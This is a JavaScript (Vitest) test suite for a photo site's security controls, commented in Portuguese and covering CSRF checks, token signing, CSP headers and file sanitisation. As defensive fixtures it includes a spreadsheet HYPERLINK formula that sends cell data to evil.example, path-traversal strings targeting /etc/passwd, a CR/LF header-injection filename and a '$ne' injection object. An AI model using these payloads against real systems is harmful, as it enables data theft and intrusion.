// Suíte dos controles de segurança.
//
// A regra que orienta o que entra aqui: um controle de segurança falha em
// silêncio. Um cabeçalho que sumiu, uma CSP que voltou a aceitar tudo, uma
// checagem de origem que passou a deixar passar — nada disso quebra uma tela,
// nada disso aparece num teste funcional, e é exatamente por isso que precisa
// de um teste próprio afirmando o comportamento negativo ("isto tem que ser
// recusado"), não só o positivo.

import { describe, it, expect } from 'vitest';
import {
  isCrossSiteRequest, signToken, verifyToken, sanitizeFilename, validatePassword,
  generateNonce, contentSecurityPolicy, htmlSecurityHeaders, adminHtmlSecurityHeaders,
  dataSecurityHeaders, honeypotTripped, honeypotFieldHTML, HONEYPOT_FIELD,
} from '../src/security.js';
import { csvCell, stripImageMetadata, bytesFromBase64, base64FromBytes, sessionCookie, clientFingerprint, TERMS_VERSION } from '../src/utils.js';
import worker, { sanitizeRestoredRequest } from '../src/index.js';

const SECRET = 'segredo-de-teste-para-hmac';

// ---------------------------------------------------------------------------
describe('isCrossSiteRequest (CSRF)', () => {
  const req = (headers, url = 'https://fotos.lucafchala.com/api/events') =>
    new Request(url, { method: 'POST', headers });

  it('accepts same-origin and user-initiated requests', () => {
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'same-origin' }))).toBe(false);
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'none' }))).toBe(false);
  });

  it('rejects cross-site requests', () => {
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'cross-site' }))).toBe(true);
  });

  it('rejects same-SITE requests, which SameSite=Strict would have allowed', () => {
    // Este é o caso que motiva a checagem existir. O cookie de sessão é
    // SameSite=Strict, e "Strict" é escopo de SITE: um subdomínio hostil de
    // lucafchala.com envia o cookie normalmente. Sec-Fetch-Site distingue
    // origem de site, e é aqui que a diferença aparece.
    expect(isCrossSiteRequest(req({ 'Sec-Fetch-Site': 'same-site' }))).toBe(true);
  });

  it('falls back to Origin when Sec-Fetch-Site is absent', () => {
    expect(isCrossSiteRequest(req({ Origin: 'https://fotos.lucafchala.com' }))).toBe(false);
    expect(isCrossSiteRequest(req({ Origin: 'https://evil.example' }))).toBe(true);
    expect(isCrossSiteRequest(req({ Origin: 'lixo-que-nao-e-url' }))).toBe(true);
  });

  it('compares Origin against the request host, not a hardcoded domain', () => {
    // O mesmo Worker atende produção, *.workers.dev e o localhost do
    // `wrangler dev`. Fixar o domínio de produção quebraria os outros dois.
    const r = new Request('https://fotos.lucafchala.workers.dev/api/events', {
      method: 'POST',
      headers: { Origin: 'https://fotos.lucafchala.workers.dev' },
    });
    expect(isCrossSiteRequest(r)).toBe(false);
  });

  it('allows requests with no browser signal at all (curl is not CSRF)', () => {
    expect(isCrossSiteRequest(req({}))).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('signed tokens', () => {
  it('round-trips a token for the right purpose and scope', async () => {
    const t = await signToken(SECRET, { purpose: 'drive', scope: 'casamento', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'casamento', ttlSecs: 3600 });
    expect(r.ok).toBe(true);
  });

  it('rejects a token minted for a different slug', async () => {
    // O ponto inteiro do nonce de página: um token obtido carregando /evento-a
    // não pode servir para pedir o link de /evento-b. Sem isto, um token
    // Turnstile válido varre o site.
    const t = await signToken(SECRET, { purpose: 'drive', scope: 'evento-a', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'evento-b', ttlSecs: 3600 });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('invalid');
  });

  it('rejects a token minted for a different purpose', async () => {
    const t = await signToken(SECRET, { purpose: 'form', scope: 'suporte', ttlSecs: 3600 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 'suporte', ttlSecs: 3600 });
    expect(r.ok).toBe(false);
  });

  it('rejects a token signed with another secret', async () => {
    const t = await signToken('outro-segredo', { purpose: 'drive', scope: 's', ttlSecs: 3600 });
    expect((await verifyToken(SECRET, t, { purpose: 'drive', scope: 's', ttlSecs: 3600 })).ok).toBe(false);
  });

  it('reports expiry separately from forgery', async () => {
    // A distinção não é cosmética: 'expired' vira 410 e o cliente recarrega a
    // página sozinho; 'invalid' vira 403 e é tratado como ataque. Trocar os
    // dois transformaria "aba aberta desde ontem" em tela de erro.
    const t = await signToken(SECRET, { purpose: 'drive', scope: 's', ttlSecs: -10 });
    const r = await verifyToken(SECRET, t, { purpose: 'drive', scope: 's', ttlSecs: -10 });
    expect(r.ok).toBe(false);
    expect(r.reason).toBe('expired');
  });

  it('does not leak expiry status for a forged token', async () => {
    // Um token forjado com exp no futuro tem que cair em 'invalid'. Se a
    // verificação de prazo viesse antes da assinatura, um atacante aprenderia
    // que o formato estava certo e só a data errada.
    const forged = `${Math.floor(Date.now() / 1000 + 9999).toString(36)}.AAAA`;
    const r = await verifyToken(SECRET, forged, { purpose: 'drive', scope: 's', ttlSecs: 3600 });
    expect(r.reason).toBe('invalid');
  });

  it('rejects missing and malformed tokens', async () => {
    for (const bad of ['', 'sem-ponto', '.', 'zzz.zzz']) {
      expect((await verifyToken(SECRET, bad, { purpose: 'drive', scope: 's', ttlSecs: 60 })).ok).toBe(false);
    }
  });

  it('enforces a minimum age against instant submissions', async () => {
    const t = await signToken(SECRET, { purpose: 'form', scope: 'suporte', ttlSecs: 7200 });
    const fresh = await verifyToken(SECRET, t, {
      purpose: 'form', scope: 'suporte', ttlSecs: 7200, minAgeSecs: 3,
    });
    expect(fresh.ok).toBe(false);
    expect(fresh.reason).toBe('too-fast');

    // Sem piso de idade, o mesmo token passa — confirma que a reprovação acima
    // veio da idade e não de outro defeito do token.
    expect((await verifyToken(SECRET, t, { purpose: 'form', scope: 'suporte', ttlSecs: 7200 })).ok).toBe(true);
  });
});

// ---------------------------------------------------------------------------
describe('csvCell (injeção de fórmula)', () => {
  it('neutralises every formula-triggering leading character', () => {
    // Estes campos são preenchidos por quem visita o site (nome no gate do
    // Drive, User-Agent, Referer) e abrem no Excel do admin.
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\t=1', '\r=1']) {
      const cell = csvCell(payload);
      expect(cell.replace(/^"/, '').startsWith("'")).toBe(true);
    }
  });

  it('neutralises a real exfiltration payload', () => {
    const attack = '=HYPERLINK("https://evil.example/?x="&A1,"clique aqui")';
    const cell = csvCell(attack);
    expect(cell).toMatch(/^"'=HYPERLINK/);
  });

  it('leaves ordinary values untouched', () => {
    expect(csvCell('Maria Silva')).toBe('Maria Silva');
    expect(csvCell('casamento-ana-joao')).toBe('casamento-ana-joao');
    expect(csvCell(42)).toBe('42');
    expect(csvCell(null)).toBe('');
  });

  it('still quotes and escapes embedded quotes and commas', () => {
    expect(csvCell('a,b')).toBe('"a,b"');
    expect(csvCell('diz "oi"')).toBe('"diz ""oi"""');
  });

  it('strips control characters that could forge the file structure', () => {
    expect(csvCell('ok\x00\x07ok')).toBe('okok');
  });
});

// ---------------------------------------------------------------------------
describe('sanitizeFilename', () => {
  it('strips path traversal', () => {
    expect(sanitizeFilename('../../../etc/passwd')).toBe('passwd.jpg');
    expect(sanitizeFilename('..\\..\\windows\\system32\\a.png')).toBe('a.png');
  });

  it('strips CR/LF that would forge the MIME attachment header', () => {
    const out = sanitizeFilename('foto.jpg\r\nContent-Type: text/html');
    expect(out).not.toMatch(/[\r\n]/);
  });

  it('normalises a double extension to a single image extension', () => {
    expect(sanitizeFilename('foto.jpg.exe')).toBe('foto_jpg.jpg');
    expect(sanitizeFilename('script.php')).toBe('script.jpg');
  });

  it('keeps legitimate names and known image extensions', () => {
    expect(sanitizeFilename('minha-foto.png')).toBe('minha-foto.png');
    expect(sanitizeFilename('IMG_2043.HEIC')).toBe('IMG_2043.heic');
  });

  it('falls back for empty or dot-only input', () => {
    expect(sanitizeFilename('')).toBe('foto.jpg');
    expect(sanitizeFilename('...')).toBe('foto.jpg');
    expect(sanitizeFilename(null)).toBe('foto.jpg');
  });
});

// ---------------------------------------------------------------------------
describe('validatePassword', () => {
  it('rejects what the old 6-character rule accepted', () => {
    for (const weak of ['123456', 'senha1', 'abc123', 'aaaaaa']) {
      expect(validatePassword(weak).ok).toBe(false);
    }
  });

  it('rejects predictable patterns and project-specific guesses', () => {
    expect(validatePassword('password1234').ok).toBe(false);
    expect(validatePassword('qwerty123456').ok).toBe(false);
    expect(validatePassword('lucafchala123').ok).toBe(false);
    expect(validatePassword('aaaaaaaaaaaaaa').ok).toBe(false);
  });

  it('accepts a strong mixed password', () => {
    expect(validatePassword('Tr0vao-Verde!42').ok).toBe(true);
  });

  it('accepts a long passphrase without symbol gymnastics', () => {
    // Exigir símbolo numa frase de 30 caracteres é atrito sem ganho de entropia.
    expect(validatePassword('cavalo bateria grampo correto azul').ok).toBe(true);
  });

  it('rejects absurdly long input that would blow the hashing CPU budget', () => {
    expect(validatePassword('a1B!'.repeat(200)).ok).toBe(false);
  });

  it('rejects non-strings', () => {
    expect(validatePassword(null).ok).toBe(false);
    expect(validatePassword(123456789012).ok).toBe(false);
  });
});

// ---------------------------------------------------------------------------
describe('cabeçalhos de segurança', () => {
  it('gives every HTML page the full baseline', () => {
    const h = htmlSecurityHeaders(generateNonce());
    expect(h['X-Content-Type-Options']).toBe('nosniff');
    expect(h['X-Frame-Options']).toBe('DENY');
    expect(h['Strict-Transport-Security']).toMatch(/max-age=63072000/);
    expect(h['Cross-Origin-Opener-Policy']).toBe('same-origin');
    expect(h['Origin-Agent-Cluster']).toBe('?1');
    expect(h['X-Permitted-Cross-Domain-Policies']).toBe('none');
    expect(h['Permissions-Policy']).toMatch(/camera=\(\)/);
    expect(h['Permissions-Policy']).toMatch(/geolocation=\(\)/);
  });

  it('never lets a data response be cached', () => {
    // /api/metrics, /api/backup e /api/consent/export devolvem dados pessoais.
    // Sem no-store eles encostam em cache de disco e de intermediário.
    const h = dataSecurityHeaders('application/json; charset=utf-8');
    expect(h['Cache-Control']).toMatch(/no-store/);
    expect(h['Referrer-Policy']).toBe('no-referrer');
    expect(h['Content-Security-Policy']).toMatch(/default-src 'none'/);
    expect(h['Content-Security-Policy']).toMatch(/sandbox/);
  });

  it('allows caching only where explicitly opted in', () => {
    const h = dataSecurityHeaders('text/plain; charset=utf-8', { store: true });
    expect(h['Cache-Control']).toBeUndefined();
  });

  it('keeps admin pages out of caches and search engines', () => {
    const h = adminHtmlSecurityHeaders(generateNonce());
    expect(h['Cache-Control']).toMatch(/no-store/);
    expect(h['X-Robots-Tag']).toMatch(/noindex/);
    expect(h['Referrer-Policy']).toBe('no-referrer');
  });
});

// ---------------------------------------------------------------------------
describe('Content-Security-Policy', () => {
  const nonce = generateNonce();

  it('carries the per-request nonce', () => {
    expect(contentSecurityPolicy(nonce)).toContain(`'nonce-${nonce}'`);
  });

  it('never permits eval, plugins or framing', () => {
    const csp = contentSecurityPolicy(nonce);
    expect(csp).not.toContain("'unsafe-eval'");
    expect(csp).toContain("object-src 'none'");
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("base-uri 'none'");
    expect(csp).toContain("form-action 'self'");
  });

  it('drops unsafe-inline in the strict (report-only) policy', () => {
    // A política estrita é a que queremos passar a impor. Ela existe em
    // Report-Only justamente para medir quantos handlers inline sobraram antes
    // da virada — ver o comentário em contentSecurityPolicy().
    const strict = contentSecurityPolicy(nonce, { strict: true });
    const scriptSrc = strict.split('; ').find(d => d.startsWith('script-src'));
    expect(scriptSrc).not.toContain("'unsafe-inline'");
    expect(scriptSrc).toContain(`'nonce-${nonce}'`);
  });

  it('still allows inline handlers in the enforced policy, on purpose', () => {
    // Se este teste virar vermelho porque alguém tirou o 'unsafe-inline' do
    // enforced, a UI quebra: nonce não cobre handler em atributo. A virada só
    // pode acontecer depois que os handlers inline sumirem do HTML.
    const enforced = contentSecurityPolicy(nonce);
    const scriptSrc = enforced.split('; ').find(d => d.startsWith('script-src'));
    expect(scriptSrc).toContain("'unsafe-inline'");
  });

  it('routes violations to the collector', () => {
    expect(contentSecurityPolicy(nonce, { strict: true })).toContain('report-uri /api/csp-report');
  });
});

describe('generateNonce', () => {
  it('produces a fresh, unpredictable value per call', () => {
    const seen = new Set(Array.from({ length: 200 }, () => generateNonce()));
    expect(seen.size).toBe(200);
    for (const n of seen) expect(n).toMatch(/^[A-Za-z0-9_-]{20,}$/);
  });
});

// ---------------------------------------------------------------------------
describe('honeypot', () => {
  it('trips only on a filled field', () => {
    expect(honeypotTripped('')).toBe(false);
    expect(honeypotTripped('   ')).toBe(false);
    expect(honeypotTripped(undefined)).toBe(false);
    expect(honeypotTripped('http://spam.example')).toBe(true);
  });

  it('renders a field hidden from people and from autofill', () => {
    // Um honeypot que o autofill do browser preenche deixa de barrar bot e
    // passa a barrar visitante.
    const html = honeypotFieldHTML();
    expect(html).toContain(`name="${HONEYPOT_FIELD}"`);
    expect(html).toContain('tabindex="-1"');
    expect(html).toContain('autocomplete="off"');
    expect(html).toContain('aria-hidden="true"');
  });
});

// ---------------------------------------------------------------------------
describe('cookie de sessão', () => {
  it('uses the __Host- prefix with the attributes that prefix requires', () => {
    const c = sessionCookie('a'.repeat(64));
    expect(c).toMatch(/^__Host-session=/);
    expect(c).toContain('Path=/');
    expect(c).toContain('Secure');
    expect(c).toContain('HttpOnly');
    expect(c).toContain('SameSite=Strict');
    // Com Domain, o browser recusa o prefixo __Host- — e é justamente o Domain
    // que permitiria a um vizinho de domínio plantar a sessão.
    expect(c).not.toContain('Domain=');
  });

  it('expires the cookie when clearing', () => {
    expect(sessionCookie('', { clear: true })).toContain('Max-Age=0');
  });
});

describe('clientFingerprint', () => {
  it('is stable for the same client and different across clients', () => {
    const mk = ua => new Request('https://x/', { headers: { 'User-Agent': ua } });
    expect(clientFingerprint(mk('Mozilla/5.0 A'))).toBe(clientFingerprint(mk('Mozilla/5.0 A')));
    expect(clientFingerprint(mk('Mozilla/5.0 A'))).not.toBe(clientFingerprint(mk('Mozilla/5.0 B')));
  });
});

// ---------------------------------------------------------------------------
describe('stripImageMetadata', () => {
  // JPEG mínimo: SOI + APP1(EXIF com uma carga reconhecível) + SOS + EOI.
  function jpegWithExif() {
    const exifPayload = [...'Exif\0\0GPSLatitude:-23.5505'].map(c => c.charCodeAt(0));
    const len = exifPayload.length + 2;
    return new Uint8Array([
      0xFF, 0xD8,
      0xFF, 0xE1, (len >> 8) & 0xFF, len & 0xFF, ...exifPayload,
      0xFF, 0xDA, 0x00, 0x02,
      0x11, 0x22, 0x33,
      0xFF, 0xD9,
    ]);
  }

  it('removes the EXIF segment from a JPEG', () => {
    const original = jpegWithExif();
    const { base64, stripped, format } = stripImageMetadata(base64FromBytes(original));
    expect(stripped).toBe(true);
    expect(format).toBe('jpeg');

    const out = bytesFromBase64(base64);
    // A coordenada de GPS que o celular gravou não pode sobreviver.
    expect(new TextDecoder().decode(out)).not.toContain('GPSLatitude');
    expect(out.length).toBeLessThan(original.length);
    // …e o resultado ainda é um JPEG: SOI na frente, dados da imagem no fim.
    expect(out[0]).toBe(0xFF);
    expect(out[1]).toBe(0xD8);
    expect(Array.from(out.slice(-2))).toEqual([0xFF, 0xD9]);
  });

  it('keeps the compressed scan data byte for byte', () => {
    const out = bytesFromBase64(stripImageMetadata(base64FromBytes(jpegWithExif())).base64);
    // 0x11 0x22 0x33 são os "pixels" do fixture: a limpeza poda contêiner, não
    // recodifica imagem.
    expect(Array.from(out)).toEqual(expect.arrayContaining([0x11, 0x22, 0x33]));
  });

  it('removes the eXIf chunk from a PNG', () => {
    const sig = [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A];
    const chunk = (type, data) => {
      const t = [...type].map(c => c.charCodeAt(0));
      const len = data.length;
      return [(len >>> 24) & 255, (len >>> 16) & 255, (len >>> 8) & 255, len & 255, ...t, ...data, 0, 0, 0, 0];
    };
    const png = new Uint8Array([
      ...sig,
      ...chunk('IHDR', [0, 0, 0, 1, 0, 0, 0, 1, 8, 0, 0, 0, 0]),
      ...chunk('eXIf', [...'GPS-AQUI'].map(c => c.charCodeAt(0))),
      ...chunk('IDAT', [1, 2, 3]),
      ...chunk('IEND', []),
    ]);
    const { base64, stripped } = stripImageMetadata(base64FromBytes(png));
    expect(stripped).toBe(true);
    const decoded = new TextDecoder().decode(bytesFromBase64(base64));
    expect(decoded).not.toContain('GPS-AQUI');
    expect(decoded).toContain('IHDR');
    expect(decoded).toContain('IDAT');
    expect(decoded).toContain('IEND');
  });

  it('returns the original untouched for formats it cannot safely rewrite', () => {
    // GIF/HEIC passam intactos de propósito: mexer neles sem um decodificador
    // de verdade arrisca corromper a prova que o titular enviou. O resultado
    // fica registrado (stripped=false) em vez de fingir que limpou.
    const gif = new Uint8Array([...'GIF89a'].map(c => c.charCodeAt(0)).concat([0, 0, 0, 0, 0, 0, 0, 0]));
    const b64 = base64FromBytes(gif);
    const r = stripImageMetadata(b64);
    expect(r.stripped).toBe(false);
    expect(r.base64).toBe(b64);
  });

  it('never throws or truncates on malformed input', () => {
    for (const junk of ['', 'not-base64!!', base64FromBytes(new Uint8Array([0xFF, 0xD8, 0xFF]))]) {
      const r = stripImageMetadata(junk);
      expect(r).toHaveProperty('base64');
      expect(r.stripped).toBe(false);
    }
  });
});

// ---------------------------------------------------------------------------
describe('sanitizeRestoredRequest', () => {
  it('keeps a well-formed record', () => {
    const clean = sanitizeRestoredRequest({
      id: 'abcdef01', eventSlug: 'casamento', eventTitle: 'Casamento',
      method: 'number', value: '42', email: 'a@b.c', phone: '11999999999',
      resolved: true, createdAt: '2026-01-01T00:00:00Z',
    });
    expect(clean.id).toBe('abcdef01');
    expect(clean.resolved).toBe(true);
    expect(clean.email).toBe('a@b.c');
  });

  it('drops records that cannot be deduplicated or resolved', () => {
    expect(sanitizeRestoredRequest(null)).toBeNull();
    expect(sanitizeRestoredRequest('uma string')).toBeNull();
    expect(sanitizeRestoredRequest([])).toBeNull();
    expect(sanitizeRestoredRequest({ email: 'a@b.c' })).toBeNull();       // sem id
    expect(sanitizeRestoredRequest({ id: { $ne: null } })).toBeNull();     // id não-string
    expect(sanitizeRestoredRequest({ id: 'NÃO-HEX' })).toBeNull();
  });

  it('discards unknown keys and wrong-typed values instead of passing them through', () => {
    const clean = sanitizeRestoredRequest({
      id: 'ab12', email: { toString: 'objeto onde o template espera string' },
      campoInventado: 'x', fileBase64: 'AAAA',
    });
    expect(clean.email).toBeUndefined();
    expect(clean.campoInventado).toBeUndefined();
    // O binário nunca volta para o KV, mesmo vindo no arquivo.
    expect(clean.fileBase64).toBeNull();
  });

  it('truncates over-long strings', () => {
    const clean = sanitizeRestoredRequest({ id: 'ab12', message: 'x'.repeat(5000) });
    expect(clean.message.length).toBe(1000);
  });
});

// ---------------------------------------------------------------------------
// Portão de CSRF no dispatcher
// ---------------------------------------------------------------------------
// A checagem de origem vive antes do roteamento de propósito: o modo de falha
// desse controle é o esquecimento, e uma rota nova escrita daqui a um ano não
// pode depender de alguém lembrar de chamá-lo. Estes testes vão pelo
// `fetch()` de verdade, não pela função auxiliar, para provar que o portão
// está no caminho e não só disponível.
describe('CSRF no dispatcher', () => {
  function kv(initial = {}) {
    const store = new Map(Object.entries(initial));
    return {
      async get(k) { return store.has(k) ? store.get(k) : null; },
      async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); },
      async list({ prefix = '' } = {}) {
        return { keys: [...store.keys()].filter(k => k.startsWith(prefix)).map(name => ({ name })), list_complete: true };
      },
    };
  }
  const ctx = { waitUntil: () => {} };
  const post = (path, headers = {}) => new Request(`https://fotos.lucafchala.com${path}`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', ...headers },
    body: '{}',
  });

  it('blocks cross-site writes before any handler runs', async () => {
    for (const path of ['/api/events', '/api/suporte', '/api/drive-link', '/dashboard/login', '/api/backup/restore']) {
      const res = await worker.fetch(post(path, { 'Sec-Fetch-Site': 'cross-site' }), { FOTOS: kv() }, ctx);
      expect(res.status, path).toBe(403);
    }
  });

  it('blocks same-site writes, which the SameSite=Strict cookie alone allowed', async () => {
    const res = await worker.fetch(post('/api/events', { 'Sec-Fetch-Site': 'same-site' }), { FOTOS: kv() }, ctx);
    expect(res.status).toBe(403);
  });

  it('lets same-origin writes through to the handler (401 here, not 403)', async () => {
    // 401 significa que a requisição CHEGOU ao handler e foi barrada pela
    // autenticação — ou seja, o portão de CSRF deixou passar como devia.
    const res = await worker.fetch(post('/api/events', { 'Sec-Fetch-Site': 'same-origin' }), { FOTOS: kv() }, ctx);
    expect(res.status).toBe(401);
  });

  it('never blocks reads', async () => {
    const res = await worker.fetch(
      new Request('https://fotos.lucafchala.com/robots.txt', { headers: { 'Sec-Fetch-Site': 'cross-site' } }),
      { FOTOS: kv() }, ctx);
    expect(res.status).toBe(200);
  });

  it('ships the security headers on public pages and on error pages alike', async () => {
    // Uma página 404 sem nosniff/X-Frame-Options continua sendo conteúdo
    // servido pela nossa origem.
    for (const path of ['/', '/__nao_existe__']) {
      const res = await worker.fetch(new Request(`https://fotos.lucafchala.com${path}`), { FOTOS: kv() }, ctx);
      expect(res.headers.get('X-Content-Type-Options'), path).toBe('nosniff');
      expect(res.headers.get('X-Frame-Options'), path).toBe('DENY');
      expect(res.headers.get('Content-Security-Policy'), path).toMatch(/frame-ancestors 'none'/);
      expect(res.headers.get('Strict-Transport-Security'), path).toMatch(/max-age=/);
    }
  });

  it('binds the CSP nonce in the header to the one in the markup', async () => {
    // Um nonce no HTML que não bate com o do cabeçalho equivale a não ter
    // nonce nenhum — e o erro é invisível enquanto 'unsafe-inline' estiver lá.
    const res = await worker.fetch(new Request('https://fotos.lucafchala.com/'), { FOTOS: kv() }, ctx);
    const headerNonce = res.headers.get('Content-Security-Policy').match(/'nonce-([A-Za-z0-9_-]+)'/)[1];
    const body = await res.text();
    expect(body).toContain(`nonce="${headerNonce}"`);
  });

  it('gives every response a fresh nonce', async () => {
    const get = async () => (await worker.fetch(
      new Request('https://fotos.lucafchala.com/'), { FOTOS: kv() }, ctx
    )).headers.get('Content-Security-Policy').match(/'nonce-([A-Za-z0-9_-]+)'/)[1];
    expect(await get()).not.toBe(await get());
  });
});

describe('CSP sem nonce (páginas de erro)', () => {
  it('omits the nonce source instead of emitting an empty one', () => {
    // `'nonce-'` vazio é sintaticamente inválido: o browser descarta o token e
    // a política passa a valer por acidente, não por intenção. Páginas de erro
    // não têm script, então a fonte simplesmente não aparece.
    const csp = contentSecurityPolicy('');
    expect(csp).not.toContain("'nonce-'");
    expect(csp).toContain("script-src 'self' 'unsafe-inline' https://challenges.cloudflare.com");
    // O resto da política continua inteiro numa página de erro.
    expect(csp).toContain("frame-ancestors 'none'");
    expect(csp).toContain("object-src 'none'");
  });
});

// ---------------------------------------------------------------------------
describe('Central de Transparência (/legal)', () => {
  function kv() {
    const store = new Map([['events', '[]']]);
    return { async get(k) { return store.has(k) ? store.get(k) : null; }, async put(k, v) { store.set(k, v); },
      async delete(k) { store.delete(k); }, async list() { return { keys: [], list_complete: true }; } };
  }
  const ctx = { waitUntil: () => {} };
  const get = p => worker.fetch(new Request('https://fotos.lucafchala.com' + p), { FOTOS: kv() }, ctx);

  it('serves the hub at /legal and at /compliance', async () => {
    for (const p of ['/legal', '/compliance']) {
      const res = await get(p);
      expect(res.status, p).toBe(200);
      expect(res.headers.get('Content-Type'), p).toMatch(/text\/html/);
    }
  });

  it('renders no unresolved template values', async () => {
    // A página é montada por template string a partir de constantes. Um nome
    // errado numa interpolação não quebra nada — só imprime "undefined" no meio
    // de uma página institucional, que é o pior lugar para isso acontecer.
    const body = await (await get('/legal')).text();
    expect(body).not.toContain('undefined');
    expect(body).not.toContain('[object');
    expect(body).not.toContain('${');
  });

  it('keeps the mandatory legal documents one click away', async () => {
    // O rodapé passou a ter um único link "Legal" no lugar de "Privacidade" e
    // "Termos". Isso só é aceitável enquanto esta página realmente levar aos
    // dois — se um deles sumir daqui, ele fica inalcançável pelo rodapé.
    const body = await (await get('/legal')).text();
    expect(body).toContain('href="/privacidade"');
    expect(body).toContain('href="/termos"');
    expect(body).toContain('privacidade@lucafchala.com');
    expect(body).toContain('security@lucafchala.com');
    expect(body).toContain('gov.br/anpd');
  });

  it('pins the Terms version it advertises to the one actually in force', async () => {
    // A página anuncia a versão dos Termos. Se ela ficar para trás de
    // TERMS_VERSION, o site passa a exibir publicamente um número errado sobre
    // o texto que as pessoas aceitaram.
    const body = await (await get('/legal')).text();
    expect(body).toContain(TERMS_VERSION);
  });

  it('is reachable from the footer of every public page', async () => {
    for (const p of ['/', '/privacidade', '/termos', '/sobre', '/suporte', '/equipamentos', '/legal']) {
      const body = await (await get(p)).text();
      expect(body, p).toContain('href="/legal" class="legal-link"');
    }
  });

  it('is listed in the sitemap', async () => {
    expect(await (await get('/sitemap.xml')).text()).toContain('/legal</loc>');
  });
});
